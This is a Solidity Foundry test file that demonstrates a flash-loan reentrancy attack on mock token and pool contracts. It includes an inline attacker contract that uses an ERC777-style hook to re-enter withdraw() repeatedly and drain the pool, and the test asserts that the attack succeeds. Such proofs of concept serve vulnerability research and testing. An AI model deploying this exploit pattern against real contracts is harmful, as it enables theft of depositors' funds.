// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockRebaseToken.sol";
import "../src/mocks/MockTokenPool.sol";

/**
 * @title FlashLoanReentrancyTest
 * @notice Proves the `flash_loan_reentrancy` template inline: the flash loan
 *         provides the capital, and the ERC777-style transfer hook lets the
 *         attacker re-enter withdraw() before the pool updates balances.
 */
contract FlashLoanReentrancyTest is Test {
    MockRebaseToken public token;
    MockTokenPool public pool;
    AttackFlashLoanReentrancy public attacker;

    function setUp() public {
        token = new MockRebaseToken();
        pool = new MockTokenPool(address(token));
        attacker = new AttackFlashLoanReentrancy(address(pool), address(token));

        // victim deposited 1000 tokens
        token.mint(address(this), 1000 ether);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(address(token), 1000 ether);
    }

    function testFlashLoanReentrancy() public {
        attacker.attack(100 ether);

        // attacker net profit after repaying the 100 flash loan
        assertGt(token.balanceOf(address(attacker)), 300 ether, "drained pool via reentrancy");
        // victim's funds lost
        assertLt(token.balanceOf(address(pool)), 1000 ether, "pool lost funds");
    }
}

/**
 * @notice Inline exploit for the flash_loan_reentrancy template steps.
 */
contract AttackFlashLoanReentrancy {
    MockTokenPool public pool;
    MockRebaseToken public token;

    bool public armed;
    uint256 public drainAmount;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _pool, address _token) {
        pool = MockTokenPool(_pool);
        token = MockRebaseToken(_token);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(address(this), address(token), amount, "");
    }

    function onFlashLoan(address, uint256 amount, bytes calldata) external {
        token.approve(address(pool), amount);
        pool.deposit(address(token), amount);

        armed = true;
        drainAmount = amount;
        attackCount = 0;
        maxAttacks = 4;

        pool.withdraw(address(token), amount); // re-enters via tokensReceived

        armed = false;
        token.transfer(msg.sender, amount); // repay flash loan
    }

    // ERC777-style hook fired on every direct transfer to this contract
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (armed && attackCount < maxAttacks) {
            attackCount++;
            pool.withdraw(address(token), drainAmount);
        }
    }
}
